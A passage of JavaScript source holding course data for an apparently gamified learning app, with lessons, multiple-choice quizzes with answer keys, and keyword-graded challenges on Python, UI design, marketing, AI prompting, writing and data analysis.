            { h: 'Lists & dicts', body: 'Lists are ordered: items = ["a", "b"]. Dicts map keys to values: user = {"name": "Ada", "xp": 120}. These two carry most programs.' },
          ],
          example: { lang: 'python', code: [
            'user = {"name": "Ada", "xp": 120}',
            'skills = ["python", "html"]',
            '',
            'if user["xp"] > 100:',
            '    print(f"{user[\'name\']} is leveling up!")',
            'else:',
            '    print("Keep going")',
          ].join('\n') },
          ask: 'What happens if you mix 2-space and 4-space indentation in one block?',
          keyPoints: ['Indentation defines blocks (4 spaces)', 'Dynamic types; f-strings for formatting', 'Lists = ordered, dicts = key→value', 'Run with: python file.py'],
          misconception: '“Python is only a beginner language.” It runs Instagram, Spotify’s backend, and most of machine learning.',
        },
        practice: [
          { q: 'How do you read a dict value by key?', choices: ['user("name")', 'user["name"]', 'user->name', 'user.name only'], answerIdx: 1, hint: 'Square brackets.', why: 'Dicts are indexed with ["key"]; .get("key") is the safe variant.' },
          { q: 'f"Total: {a+b}" is an example of…', choices: ['a regex', 'an f-string', 'a lambda', 'a decorator'], answerIdx: 1, hint: 'The f prefix.', why: 'f-strings interpolate expressions directly.' },
        ],
        challenge: {
          type: 'js-static', kind: 'checkpoint', title: 'Write & explain a Python script', timeMin: 30,
          brief: 'Write a Python script (pseudo or real, in one block) that reads a list of prices and prints the average and the most expensive price. Explain each step in comments. Then answer: how would you handle an empty list?',
          requirements: ['list of prices defined', 'computes average', 'computes max', 'comments explain steps', 'empty-list edge case answered'],
          passScore: 70, rewardNim: 2, xp: 100,
          evaluator: { type: 'js-static', config: { checks: [
            { id: 'list', label: 'defines a list of values', pattern: '\\[\\s*[0-9]', weight: 15 },
            { id: 'sum-avg', label: 'computes sum or average', pattern: 'sum|average|mean|total', weight: 20 },
            { id: 'max', label: 'computes the maximum', pattern: 'max|largest|highest', weight: 20 },
            { id: 'print', label: 'prints results', pattern: 'print', weight: 15 },
            { id: 'len', label: 'guards/uses length', pattern: 'len\\(|if\\s+not|==\\s*0|len', weight: 15 },
          ], explainMinWords: 25 } },
        },
      },
      {
        slug: 'python-control', title: 'Loops, Functions & Logic', estMin: 30, difficulty: 2,
        lesson: {
          tldr: 'for repeats over things, def packages logic, and boolean logic makes decisions.',
          sections: [
            { h: 'for loops', body: 'for item in items: iterates any sequence. range(10) counts; enumerate() gives index + value.' },
            { h: 'def functions', body: 'def greet(name): return f"Hi {name}". Parameters in, return out. Default arguments make functions flexible.' },
            { h: 'Truthiness', body: 'if items: runs when the list is non-empty. and/or/not combine conditions; empty values are falsy.' },
          ],
          example: { lang: 'python', code: [
            'def average(numbers):',
            '    if not numbers:',
            '        return 0',
            '    return sum(numbers) / len(numbers)',
            '',
            'for i, price in enumerate([2, 4, 6], start=1):',
            '    print(i, average([price]))',
          ].join('\n') },
          ask: 'Why is "if not numbers:" a good guard before dividing by len(numbers)?',
          keyPoints: ['for + enumerate for indexed loops', 'def with defaults; return values', 'Falsy: 0, "", [], None', 'Guard clauses prevent crashes'],
          misconception: '“Functions must return a value.” Without return, Python gives None silently — a classic bug source.',
        },
        practice: [
          { q: 'What does len([1,2,3]) return?', choices: ['2', '3', 'TypeError', 'None'], answerIdx: 1, hint: 'Count the items.', why: 'len() is the universal length function.' },
          { q: 'Which value is falsy?', choices: ['"0"', '[]', '{x: 1}', '-1'], answerIdx: 1, hint: 'Empty collections.', why: 'An empty list is falsy; the string "0" and -1 are truthy.' },
        ],
        challenge: {
          type: 'js-static', kind: 'checkpoint', title: 'Automate a boring task', timeMin: 30,
          brief: 'Describe or write a Python function that takes a filename and returns how many lines contain the word "ERROR". Include a loop, a condition, and a return. Explain how you would test it.',
          requirements: ['function with parameter', 'loop over lines', 'condition checking ERROR', 'returns a count', 'testing approach explained'],
          passScore: 70, rewardNim: 2, xp: 100,
          evaluator: { type: 'js-static', config: { checks: [
            { id: 'def', label: 'defines a function', pattern: 'def\\s+\\w+\\(', weight: 20 },
            { id: 'loop', label: 'iterates (for/while/comprehension)', pattern: 'for\\s|while\\s|in\\s+f|readlines|\\[.+for .+in .+\\]', weight: 20 },
            { id: 'cond', label: 'checks condition (if/in)', pattern: 'if\\s|in\\s+', weight: 15 },
            { id: 'ret', label: 'returns a value', pattern: 'return', weight: 15 },
            { id: 'error', label: 'targets the ERROR keyword', pattern: 'ERROR', weight: 10 },
          ], explainMinWords: 25 } },
        },
      },
      {
        slug: 'python-data', title: 'Lists, Dicts & Data Wrangling', estMin: 30, difficulty: 2,
        lesson: {
          tldr: 'Real programs move data: filter lists, group dicts, transform everything with comprehensions.',
          sections: [
            { h: 'Comprehensions', body: '[x * 2 for x in nums if x > 0] builds a list in one readable line. Dict comprehensions do the same for key→value maps.' },
            { h: 'Slicing & sorting', body: 'items[1:4] slices; sorted(items, key=len, reverse=True) orders by any rule.' },
            { h: 'Grouping pattern', body: 'for row in rows: groups.setdefault(row["type"], []).append(row) — the backbone of reporting scripts.' },
          ],
          example: { lang: 'python', code: [
            'orders = [{"total": 12, "type": "food"}, {"total": 30, "type": "food"}, {"total": 7, "type": "book"}]',
            'totals = {}',
            'for o in orders:',
            '    totals[o["type"]] = totals.get(o["type"], 0) + o["total"]',
            '# {"food": 42, "book": 7}',
          ].join('\n') },
          ask: 'Rewrite: result = [] / for n in nums: / if n % 2 == 0: result.append(n) — as one comprehension.',
          keyPoints: ['Comprehensions = filter + map in one line', 'sorted(key=…) orders by any rule', 'dict.get(k, default) for safe grouping', 'Small scripts beat big spreadsheets'],
          misconception: '“Comprehensions are show-offs.” They are clearer than 4-line loops once you read a few.',
        },
        practice: [
          { q: 'What does [w for w in words if len(w) > 3] do?', choices: ['errors', 'keeps words longer than 3 letters', 'sorts words', 'counts words'], answerIdx: 1, hint: 'if filters.', why: 'It filters then collects — a filtered copy.' },
          { q: 'sorted(items, key=len) sorts by…', choices: ['alphabet', 'length', 'value', 'insertion order'], answerIdx: 1, hint: 'The key function decides.', why: 'key=len sorts using each item’s length.' },
        ],
        challenge: {
          type: 'data', kind: 'checkpoint', title: 'Analyze a small dataset', timeMin: 30,
          brief: 'You ran a survey of 40 learners. Scores by week: W1: 12,20,15,9,18,14,22,11 · W2: 18,24,19,15,21,25,17,20 · W3: 25,28,22,26,30,24,27,29 · W4: 30,32,28,31,33,29,35,34. In 200+ words: identify three trends with numbers, one surprise, and one recommendation.',
          requirements: ['≥3 numeric trends', 'names a surprise/anomaly', 'gives one recommendation', '200+ words', 'structured (findings listed)'],
          passScore: 70, rewardNim: 2, xp: 110,
          evaluator: { type: 'data', config: { minWords: 150, keyConcepts: ['increase', 'trend', 'average', 'growth', 'improve', 'week', 'score'], minNumbers: 4, minFindings: 3 } },
        },
      },
    ],
    finalAssessment: {
      type: 'js-static', kind: 'final', title: 'Final Skill Assessment: Automation Script', timeMin: 40,
      brief: 'Write (or describe in precise pseudo-code) a Python script that reads a CSV of transactions and prints: total revenue, top 3 largest transactions, and any suspicious duplicates (same amount, same day, twice). Explain your data structures and edge cases.',
      requirements: ['parses/iterates rows', 'computes total', 'finds top 3', 'detects duplicates', 'explains structures + edge cases'],
      passScore: 75, rewardNim: 5, xp: 250,
      evaluator: { type: 'js-static', config: { checks: [
        { id: 'loop', label: 'iterates rows', pattern: 'for\\s|csv|DictReader|reader', weight: 15 },
        { id: 'total', label: 'computes a total', pattern: 'sum|total|\\+=', weight: 15 },
        { id: 'top', label: 'finds top transactions', pattern: 'sort|max|nlargest|top', weight: 15 },
        { id: 'dup', label: 'handles duplicates', pattern: 'dup|set\\(|count|seen|dict', weight: 20 },
        { id: 'edge', label: 'mentions edge cases', pattern: 'empty|missing|error|except|invalid|nan', weight: 15 },
      ], explainMinWords: 40 } },
    },
  }),

  /* ═════════════════════════════ UI DESIGN ═════════════════════════ */
  'ui-design': T({
    goalKeywords: ['design', 'ui', 'ux', 'figma', 'interface', 'app design', 'wireframe', 'typography', 'designer'],
    topics: [
      {
        slug: 'visual-hierarchy', title: 'Visual Hierarchy', estMin: 25, difficulty: 1,
        lesson: {
          tldr: 'Hierarchy tells the eye what matters first. Size, weight, contrast, and space do the talking.',
          sections: [
            { h: 'One primary action', body: 'Every screen has one hero element: the headline, the CTA. Make it dominant; demote everything else.' },
            { h: 'Type scale', body: 'Pick 3-5 sizes (e.g. 28/20/16/13) and never improvise. Big-to-small contrast creates order.' },
            { h: 'Space groups meaning', body: 'Things close together read as one group. Generous white space around sections beats boxes around everything.' },
          ],
          example: { lang: 'text', code: 'Hero screen: H1 32px bold (primary) → subtitle 16px regular (secondary) → button 16px semibold on filled brand color (action) → footer links 13px muted (tertiary).' },
          ask: 'Open any app on your phone. What is the primary element — and is it actually the strongest visually?',
          keyPoints: ['One dominant element per screen', 'A fixed type scale (3–5 sizes)', 'Proximity groups content', 'Contrast guides the eye deliberately'],
          misconception: '“More emphasis = better.” Emphasizing everything emphasizes nothing.',
        },
        practice: [
          { q: 'A screen has 3 equally-loud buttons. The fix is…', choices: ['make all bigger', 'choose one primary, style the rest quieter', 'add icons to all', 'more colors'], answerIdx: 1, hint: 'Decide what matters.', why: 'One primary action, others as secondary/tertiary styles.' },
          { q: 'White space is…', choices: ['wasted space', 'a grouping and breathing tool', 'only for luxury brands', 'unprofessional'], answerIdx: 1, hint: 'Think grouping.', why: 'Space is the cheapest way to structure a screen.' },
        ],
        challenge: {
          type: 'design', kind: 'checkpoint', title: 'Design a sign-up screen', timeMin: 30,
          brief: 'Design (describe precisely — text wireframe) a mobile sign-up screen: elements, sizes, weights, colors, spacing, and the ONE primary action. Justify every hierarchy decision.',
          requirements: ['element inventory', 'explicit sizes/weights', 'one clear primary action', 'spacing/grouping logic', 'justification for choices'],
          passScore: 70, rewardNim: 2, xp: 100,
          evaluator: { type: 'design', config: { minWords: 120, keyConcepts: ['primary', 'size', 'weight', 'spacing', 'contrast', 'button', 'hierarchy'] } },
        },
      },
      {
        slug: 'color-type', title: 'Color & Typography', estMin: 25, difficulty: 2,
        lesson: {
          tldr: 'A tight palette (1 brand, 2 neutrals, 1 semantic) and 2 typefaces with clear roles make design feel intentional.',
          sections: [
            { h: 'The 60-30-10 rule', body: '≈60% neutral surface, 30% secondary, 10% accent. Accents earn attention because they are rare.' },
            { h: 'Contrast & accessibility', body: 'Body text needs ≥4.5:1 contrast (WCAG AA). Test text on every background you use.' },
            { h: 'Type pairing', body: 'One family can carry a whole product (weights do the work). Pairing two? Contrast roles: geometric headings + humanist body.' },
          ],
          example: { lang: 'text', code: 'Palette: background #F6F5FB · ink #16182D · brand #5B57D9 · success #12B76A (10% usage). Type: Inter — 28 bold headings, 16 regular body, 13 medium captions.' },
          ask: 'Why should your brand color appear rarely?',
          keyPoints: ['60-30-10 palette balance', 'AA contrast: 4.5:1 body text', 'One family + weights beats random pairing', 'Color supports hierarchy, never replaces it'],
          misconception: '“Accessibility limits design.” Contrast constraints produce stronger, clearer palettes.',
        },
        practice: [
          { q: 'Minimum WCAG AA contrast for body text?', choices: ['2:1', '3:1', '4.5:1', '10:1'], answerIdx: 2, hint: 'The common threshold.', why: '4.5:1 for normal text, 3:1 for large text.' },
          { q: 'Your accent color is best used…', choices: ['everywhere', 'on ~10% of the UI (key actions)', 'only on backgrounds', 'never'], answerIdx: 1, hint: 'Scarcity = attention.', why: 'Rare accents keep CTAs noticeable.' },
        ],
        challenge: {
          type: 'design', kind: 'checkpoint', title: 'Define a design system', timeMin: 30,
          brief: 'Create the foundations for a savings app: full palette with hex codes + roles, type scale, spacing scale, and where the accent color may/may not appear. Explain contrast checks.',
          requirements: ['palette w/ hex + roles', 'type scale (≥4 steps)', 'spacing scale', 'accent usage rules', 'contrast check explained'],
          passScore: 70, rewardNim: 2, xp: 110,
          evaluator: { type: 'design', config: { minWords: 120, keyConcepts: ['color', 'type', 'spacing', 'contrast', 'accent', 'scale', 'role'] } },
        },
      },
      {
        slug: 'mobile-ui-patterns', title: 'Mobile UI Patterns', estMin: 30, difficulty: 2,
        lesson: {
          tldr: 'Great mobile UIs reuse known patterns: bottom navs, cards, sheets, thumb-reachable actions.',
          sections: [
            { h: 'Thumbs first', body: 'Primary actions live in the bottom third. Bottom navigation = 5 max, labels always visible.' },
            { h: 'Cards & lists', body: 'Cards bundle one concept with one action each. Lists for scanning; cards for comparing.' },
            { h: 'Feedback states', body: 'Every tap gets a response: pressed state, loading, success, error, empty. Design all five or users feel lost.' },
          ],
          example: { lang: 'text', code: 'Banking app: bottom nav (Home/ Cards/ Stats) · balance card up top · transactions list below · FAB for “Send” in thumb reach · pull-to-refresh with skeleton loading.' },
          ask: 'Name an app whose main action sits where your thumb naturally rests.',
          keyPoints: ['Thumb zone decides placement', '≤5 tabs, always labeled', 'Cards = one concept + one action', 'Design loading/empty/error states'],
          misconception: '“Hidden menus look cleaner.” Discoverability beats tidiness — key actions must be visible.',
        },
        practice: [
          { q: 'Max recommended items in a bottom nav?', choices: ['3', '5', '7', 'unlimited'], answerIdx: 1, hint: 'Plus a “More” tab beyond that.', why: '5 keeps targets comfortable and memorable.' },
          { q: 'Which state do designers most often forget?', choices: ['loading', 'empty', 'error', 'all of them'], answerIdx: 3, hint: 'Be honest.', why: 'Empty/error/loading are the classic omissions.' },
        ],
        challenge: {
          type: 'design', kind: 'project', title: 'Design a mobile banking dashboard', timeMin: 40,
          brief: 'Describe a complete mobile banking dashboard: layout top-to-bottom, the primary action and its placement, card/list structure, all five UI states, and accessibility notes. Be concrete — sizes, positions, wording.',
          requirements: ['full layout description', 'primary action + thumb placement', '≥3 UI states designed', 'accessibility notes', 'concrete numbers (px/sizes)'],
          passScore: 70, rewardNim: 3, xp: 150,
          evaluator: { type: 'design', config: { minWords: 180, keyConcepts: ['primary', 'nav', 'card', 'state', 'loading', 'empty', 'error', 'thumb', 'contrast', 'spacing'] } },
        },
      },
    ],
    finalAssessment: {
      type: 'design', kind: 'final', title: 'Final Skill Assessment: End-to-End App Screen', timeMin: 45,
      brief: 'Design any app screen end-to-end: hierarchy, palette w/ roles, type scale, spacing, states (loading/empty/error), accessibility, and one delightful micro-interaction. Defend every decision.',
      requirements: ['hierarchy + primary action', 'palette + type + spacing scales', 'all core states', 'accessibility checks', 'micro-interaction rationale'],
      passScore: 75, rewardNim: 5, xp: 250,
      evaluator: { type: 'design', config: { minWords: 200, keyConcepts: ['hierarchy', 'contrast', 'spacing', 'state', 'accessib', 'primary', 'type', 'color', 'micro'] } },
    },
  }),

  /* ═════════════════════════════ MARKETING ═════════════════════════ */
  marketing: T({
    goalKeywords: ['marketing', 'growth', 'campaign', 'ads', 'seo', 'brand', 'audience', 'sales funnel', 'promote'],
    topics: [
      {
        slug: 'positioning', title: 'Positioning & Audience', estMin: 25, difficulty: 1,
        lesson: {
          tldr: 'Marketing starts before the ad: who exactly is this for, and why you instead of anyone else?',
          sections: [
            { h: 'Narrow beats broad', body: '“Everyone” is not an audience. “Night-shift nurses who need quick meal prep” is — you can name their problem, their channels, their words.' },
            { h: 'The one-sentence pitch', body: 'For [audience], [product] is the [category] that [key benefit], unlike [alternative].' },
            { h: 'Jobs to be done', body: 'People hire products for a job: “hire a meal kit” to save decision fatigue. Sell the outcome, not the features.' },
          ],
          example: { lang: 'text', code: 'For freelancers who hate invoicing, PayDay is the invoicing tool that gets you paid in one tap — unlike spreadsheets, it chases late payers for you.' },
          ask: 'Write a one-sentence pitch for something you know well. Who exactly is it for?',
          keyPoints: ['Specific audience → specific message', 'Pitch formula: audience / category / benefit / unlike', 'Sell the job-to-be-done outcome', 'Features support benefits, never replace them'],
          misconception: '“Good products sell themselves.” Distribution and message are half the product.',
        },
        practice: [
          { q: 'The strongest positioning statement starts with…', choices: ['our features', 'a specific audience', 'our company history', 'the price'], answerIdx: 1, hint: 'Who first.', why: 'Audience defines everything downstream.' },
          { q: 'A “job to be done” describes…', choices: ['a job advert', 'the outcome a customer hires a product for', 'a feature list', 'the CEO’s tasks'], answerIdx: 1, hint: 'Outcome, not object.', why: 'Customers hire products to make progress.' },
        ],
        challenge: {
          type: 'business', kind: 'checkpoint', title: 'Position a new product', timeMin: 30,
          brief: 'Pick (or invent) a small product. Write: the specific audience, the one-sentence pitch, three jobs-to-be-done, and the alternative people would use instead. 150+ words, structured.',
          requirements: ['specific audience', 'one-sentence pitch', '3 JTBD', 'names the real alternative', '150+ words'],
          passScore: 70, rewardNim: 2, xp: 100,
          evaluator: { type: 'business', config: { minWords: 120, sections: [['audience', 'who', 'for'], ['pitch', 'unlike', 'instead'], ['job', 'outcome', 'help']], keyConcepts: ['audience', 'benefit', 'instead', 'problem', 'outcome'], minNumbers: 0 } },
        },
      },
      {
        slug: 'campaign-basics', title: 'Campaigns & Channels', estMin: 30, difficulty: 2,
        lesson: {
          tldr: 'A campaign = one audience, one message, one desired action, delivered where they already are.',
          sections: [
            { h: 'The message ladder', body: 'Awareness → interest → action. Early content teaches; late content converts. One campaign should push ONE action.' },
            { h: 'Choosing channels', body: 'Go where your audience already spends time. Two channels done well beat six done badly.' },
            { h: 'Measuring', body: 'Define the metric before launching: signups? sales? replies? Everything else is commentary.' },
          ],
          example: { lang: 'text', code: 'Launch: “Meal-prep for night nurses.” Channel 1: TikTok 15s recipe clips (awareness) · Channel 2: WhatsApp broadcast with first-order code (action) · Metric: 200 first orders in 30 days.' },
          ask: 'If a campaign had to succeed on ONE metric, what should yours be?',
          keyPoints: ['One audience + one message + one action', 'Awareness vs conversion content differ', 'Few channels, done properly', 'Metric defined before launch'],
          misconception: '“Post everywhere.” Spraying weakens message and exhausts the team.',
        },
        practice: [
          { q: 'How many primary actions should one campaign push?', choices: ['1', '3', 'as many as possible', '0'], answerIdx: 0, hint: 'Focus.', why: 'One ask converts; many asks confuse.' },
          { q: 'The right time to define success metrics is…', choices: ['after the campaign', 'before launch', 'when the boss asks', 'never — vibes'], answerIdx: 1, hint: 'Design for the goal.', why: 'Pre-launch metrics shape creative and channel choices.' },
        ],
        challenge: {
          type: 'business', kind: 'checkpoint', title: 'Write a product campaign', timeMin: 35,
          brief: 'Design a full campaign for a new product: audience, one-line message, the single desired action, two channels with concrete post/ad examples, and the success metric with a number target.',
          requirements: ['audience + message', 'one clear action', '2 channels w/ concrete examples', 'metric + numeric target', '200+ words'],
          passScore: 70, rewardNim: 2, xp: 110,
          evaluator: { type: 'business', config: { minWords: 180, sections: [['audience', 'who'], ['message', 'tagline'], ['channel', 'post', 'ad'], ['metric', 'target', 'goal']], keyConcepts: ['audience', 'action', 'channel', 'metric', 'message'], minNumbers: 2 } },
        },
      },
    ],
    finalAssessment: {
      type: 'business', kind: 'final', title: 'Final Skill Assessment: Go-to-Market Plan', timeMin: 45,
      brief: 'Write a complete go-to-market plan for a product of your choice: positioning, audience, message, channel plan with examples, launch timeline, budget split, and success metrics.',
      requirements: ['positioning', 'channels + examples', 'timeline', 'budget', 'metrics w/ numbers'],
      passScore: 75, rewardNim: 5, xp: 250,
      evaluator: { type: 'business', config: { minWords: 250, sections: [['position', 'audience'], ['channel'], ['timeline', 'week'], ['budget', 'cost'], ['metric', 'kpi']], keyConcepts: ['audience', 'message', 'channel', 'metric', 'budget', 'launch'], minNumbers: 4 } },
    },
  }),

  /* ═══════════════════════════════ AI ══════════════════════════════ */
  ai: T({
    goalKeywords: ['ai', 'artificial intelligence', 'chatgpt', 'prompt', 'llm', 'machine learning', 'automation ai', 'gpt'],
    topics: [
      {
        slug: 'prompting', title: 'Prompting That Works', estMin: 25, difficulty: 1,
        lesson: {
          tldr: 'A good prompt assigns a role, gives context, defines the output format, and shows an example.',
          sections: [
            { h: 'The R-C-F-E pattern', body: 'Role (“You are a copywriter”), Context (product, audience, constraints), Format (bullet list, table, JSON), Example (one ideal output).' },
            { h: 'Iterate, don’t accept', body: 'The first output is a draft. Push back: “shorter”, “more concrete”, “remove adjectives”.' },
            { h: 'Trust but verify', body: 'LLMs invent facts. Anything factual gets checked against a real source before you ship it.' },
          ],
          example: { lang: 'text', code: 'Role: You are a landing-page copywriter.\nContext: “FocusFlow”, a focus timer for students; audience = university students; tone = friendly, zero jargon.\nFormat: 3 headline options + 1 subheading, max 8 words each.\nExample: “Study deeper. Not longer.”' },
          ask: 'Rewrite this prompt so it actually works: “write something about my app”.',
          keyPoints: ['Role + Context + Format + Example', 'First output = draft; iterate', 'Verify facts outside the model', 'Small, specific prompts beat giant vague ones'],
          misconception: '“Prompting is typing a wish.” It is briefing a very fast, very literal intern.',
        },
        practice: [
          { q: 'Which prompt will produce better output?', choices: ['write about dogs', 'You are a vet blogger. Write 5 FAQ Q&As about puppy vaccination, friendly tone, max 40 words each', 'write text', 'make it good'], answerIdx: 1, hint: 'R-C-F-E.', why: 'Role, context, format, and constraint produce usable drafts.' },
          { q: 'An LLM states a statistic confidently. You should…', choices: ['trust it', 'verify it against a source', 'assume it is false always', 'ask it twice'], answerIdx: 1, hint: 'Not paranoia — process.', why: 'Models can hallucinate; verification is the workflow.' },
        ],
        challenge: {
          type: 'business', kind: 'checkpoint', title: 'Build a reusable prompt', timeMin: 25,
          brief: 'Write a production-grade prompt for a real task you repeat (emails, summaries, product text). Include role, context, format, one example, and how you would verify the output.',
          requirements: ['explicit role', 'context + constraints', 'defined output format', 'includes an example', 'verification step'],
          passScore: 70, rewardNim: 2, xp: 100,
          evaluator: { type: 'business', config: { minWords: 120, sections: [['role', 'you are'], ['format', 'output'], ['example'], ['verif', 'check']], keyConcepts: ['role', 'context', 'format', 'example', 'verify'], minNumbers: 0 } },
        },
      },
      {
        slug: 'ai-workflows', title: 'AI Workflows for Real Work', estMin: 30, difficulty: 2,
        lesson: {
          tldr: 'One-off prompts save minutes; workflows save hours. Chain steps: draft → critique → refine → check.',
          sections: [
            { h: 'Chaining', body: 'Break a job into steps and give each step its own prompt: outline → draft → critique your own draft → final. Quality jumps.' },
            { h: 'Human in the loop', body: 'Automate the 80%, review the 20% that carries risk (numbers, names, claims, anything sent to customers).' },
            { h: 'Know the failure modes', body: 'Hallucination, sycophancy (it agrees with you), and stale knowledge. Design your workflow to catch all three.' },
          ],
          example: { lang: 'text', code: 'Support-reply workflow: 1) Classify ticket 2) Draft reply (role+context prompt) 3) Self-critique: “list any claims needing a human” 4) Human approves before send.' },
          ask: 'Which step in your weekly work would an AI chain genuinely speed up — and where must a human stay?',
          keyPoints: ['Chain: draft → critique → refine', 'Automate 80%, review risky 20%', 'Watch: hallucination, sycophancy, stale data', 'Measure time saved or it is a toy'],
          misconception: '“AI replaces the workflow.” It replaces steps inside a workflow you still own.',
        },
        practice: [
          { q: 'The highest-leverage AI workflow step is often…', choices: ['generate more', 'self-critique before final', 'longer prompts', 'more emojis'], answerIdx: 1, hint: 'Quality control.', why: 'Making the model critique its own draft catches most weakness.' },
          { q: 'What must always stay human?', choices: ['everything', 'risky outputs (claims, numbers, customers)', 'nothing', 'only spelling'], answerIdx: 1, hint: 'Risk-based review.', why: 'Review where errors cost money or trust.' },
        ],
        challenge: {
          type: 'business', kind: 'project', title: 'Design an AI workflow', timeMin: 35,
          brief: 'Design an AI workflow that solves a real problem for a real business (e.g. auto-drafting supplier emails, summarizing reviews, listing products). Specify: inputs, each chain step with its prompt pattern, the human checkpoint, the failure mode it guards against, and the measurable benefit.',
          requirements: ['real problem + business', '≥3 chained steps', 'human checkpoint defined', 'failure mode addressed', 'measurable benefit (number)'],
          passScore: 70, rewardNim: 3, xp: 150,
          evaluator: { type: 'business', config: { minWords: 180, sections: [['problem', 'business'], ['step', 'chain', 'stage'], ['human', 'checkpoint', 'review'], ['fail', 'hallucin', 'guard'], ['benefit', 'save', 'hours', '%']], keyConcepts: ['workflow', 'step', 'prompt', 'review', 'error', 'time'], minNumbers: 2 } },
        },
      },
    ],
    finalAssessment: {
      type: 'business', kind: 'final', title: 'Final Skill Assessment: AI Ops Plan', timeMin: 45,
      brief: 'Plan AI adoption for a small business of your choice: 3 workflows, prompts for each, human review policy, failure modes, and expected hours saved per week.',
      requirements: ['3 workflows', 'prompt patterns', 'review policy', 'failure modes', 'hours saved estimate'],
      passScore: 75, rewardNim: 5, xp: 250,
      evaluator: { type: 'business', config: { minWords: 250, sections: [['workflow'], ['prompt'], ['review', 'human'], ['fail'], ['hours', 'save']], keyConcepts: ['prompt', 'workflow', 'review', 'risk', 'save'], minNumbers: 3 } },
    },
  }),

  /* ═════════════════════════════ WRITING ═══════════════════════════ */
  writing: T({
    goalKeywords: ['writing', 'write', 'copywriting', 'blogger', 'blog', 'content writing', 'essay'],
    topics: [
      {
        slug: 'clarity-first', title: 'Clarity First', estMin: 25, difficulty: 1,
        lesson: {
          tldr: 'Clear writing = short sentences, concrete words, one idea per paragraph.',
          sections: [
            { h: 'Cut the fog', body: 'If a sentence needs re-reading, it is too long. Aim for 8–25 words. “Utilize” → “use”. Delete adverbs that don’t earn their keep.' },
            { h: 'One idea per paragraph', body: 'Paragraphs are containers for single thoughts. If you start a new idea, start a new paragraph.' },
            { h: 'Front-load', body: 'Put the point in the first sentence — readers decide in seconds whether to continue.' },
          ],
          example: { lang: 'text', code: 'Foggy: “It should be noted that our platform is able to facilitate the optimization of workflows.”\nClear: “Our platform speeds up your workflow.”' },
          ask: 'Take your last message and cut 30% of the words. What did you lose?',
          keyPoints: ['8–25 word sentences', 'Concrete beats abstract', 'One idea per paragraph', 'The point goes first'],
          misconception: '“Longer sounds smarter.” Shorter sounds confident.',
        },
        practice: [
          { q: 'Best revision of “We are in receipt of your correspondence”?', choices: ['“Thank you for your letter”', '“Your correspondence has been received”', '“This acknowledges receipt”', 'keep it'], answerIdx: 0, hint: 'Shorter, warmer.', why: 'Plain verbs and fewer words win.' },
          { q: 'The main point of a paragraph should sit…', choices: ['at the end', 'in the first sentence', 'wherever', 'in a footnote'], answerIdx: 1, hint: 'Readers skim the start.', why: 'Front-loading survives skimming.' },
        ],
        challenge: {
          type: 'text', kind: 'checkpoint', title: 'Rewrite for clarity', timeMin: 25,
          brief: 'Rewrite this foggy paragraph in clear language (keep all meaning): “It has come to our attention that a significant number of our valued customers have been experiencing difficulties with regard to the utilization of the recently released software update, and we would like to hereby express our sincere apologies for any inconvenience that may have been caused.” Then write one sentence explaining what you changed.',
          requirements: ['full rewrite provided', 'keeps all meaning', 'significantly shorter', 'plain verbs', 'explanation included'],
          passScore: 70, rewardNim: 2, xp: 100,
          evaluator: { type: 'text', config: { minWords: 40, targetWords: 90, keyConcepts: ['update', 'apolog', 'sorry', 'difficult', 'customer', 'problem'], keyConceptRatio: 0.5, headings: 0 } },
        },
      },
      {
        slug: 'persuasive-structure', title: 'Persuasive Structure', estMin: 30, difficulty: 2,
        lesson: {
          tldr: 'Persuasion has a shape: hook → problem → solution → proof → action.',
          sections: [
            { h: 'The hook', body: 'The first line earns the second. Open with the reader’s problem, a surprising number, or a vivid scene — never with “In today’s world…”.' },
            { h: 'Proof beats adjectives', body: '“Amazing quality” convinces no one. Specifics convince: “survived 200 washes in testing”.' },
            { h: 'One call-to-action', body: 'End by asking for exactly one thing, and make it effortless.' },
          ],
          example: { lang: 'text', code: 'Hook: “You lose 2 hours a week to invoice admin.”\nProblem: chasing late payers…\nSolution: PayDay auto-chases…\nProof: “Freelancers get paid 9 days faster.”\nCTA: “Start free — no card needed.”' },
          ask: 'Find a piece of copy that convinced you recently. Which structural part did the work?',
          keyPoints: ['Hook earns attention', 'Specific proof beats adjectives', 'One CTA, zero friction', 'Structure: hook → problem → solution → proof → action'],
          misconception: '“Persuasion = pressure.” Clarity + proof persuade more than hype.',
        },
        practice: [
          { q: 'Strongest hook for a budgeting app?', choices: ['“In today’s fast-paced world…”', '“You are probably losing ₦20,000 a month without noticing.”', '“Budget Master is an app.”', '“Welcome to our website!”'], answerIdx: 1, hint: 'Reader’s problem, concrete.', why: 'Specific loss + second person hooks hard.' },
          { q: 'How many CTAs should a persuasive piece end with?', choices: ['0', '1', '2-3', 'as many as fit'], answerIdx: 1, hint: 'Decision fatigue is real.', why: 'One ask removes friction.' },
        ],
        challenge: {
          type: 'text', kind: 'project', title: 'Write a 400-word product launch piece', timeMin: 35,
          brief: 'Write a launch article (≈400 words) for any product: hook, problem, solution, concrete proof, one CTA. Every claim must be specific — no empty adjectives.',
          requirements: ['hook present', 'problem → solution flow', 'specific proof (numbers/examples)', 'exactly one CTA', '350–500 words'],
          passScore: 70, rewardNim: 3, xp: 150,
          evaluator: { type: 'text', config: { minWords: 320, targetWords: 420, keyConcepts: ['problem', 'solution', 'because', 'instead', 'result'], keyConceptRatio: 0.4, headings: 2 } },
        },
      },
    ],
    finalAssessment: {
      type: 'text', kind: 'final', title: 'Final Skill Assessment: Publish-Ready Essay', timeMin: 45,
      brief: 'Write a 500-word essay on any topic you care about: front-loaded thesis, clear paragraphs, concrete examples, zero fog. It should be publishable as-is.',
      requirements: ['thesis in line 1-2', 'concrete examples', '350–550 words', 'no fog phrases', 'clean ending (no “in conclusion”)'],
      passScore: 75, rewardNim: 5, xp: 250,
      evaluator: { type: 'text', config: { minWords: 420, targetWords: 500, keyConcepts: [], keyConceptRatio: 0, headings: 3 } },
    },
  }),

  /* ═══════════════════════════ DATA ANALYSIS ═══════════════════════ */
  'data-analysis': T({
    goalKeywords: ['data', 'analytics', 'excel', 'spreadsheet', 'charts', 'statistics', 'sql', 'analysis', 'analyze'],
    topics: [
      {
        slug: 'ask-the-question', title: 'Ask the Question First', estMin: 25, difficulty: 1,
        lesson: {
          tldr: 'Analysis without a question is trivia. Start with a decision someone needs to make.',
          sections: [
            { h: 'Decision-driven data', body: '“Should we keep the weekend discount?” — now the data has a job. Write the question, then find the smallest data that answers it.' },
            { h: 'Metrics vs vanity', body: '“Page views” flatter; “signups per visit” decides. A good metric is one you would act on if it moved.' },
            { h: 'Sanity-check the data', body: 'Before analysis: missing values? duplicates? units? Garbage in, confident nonsense out.' },
          ],
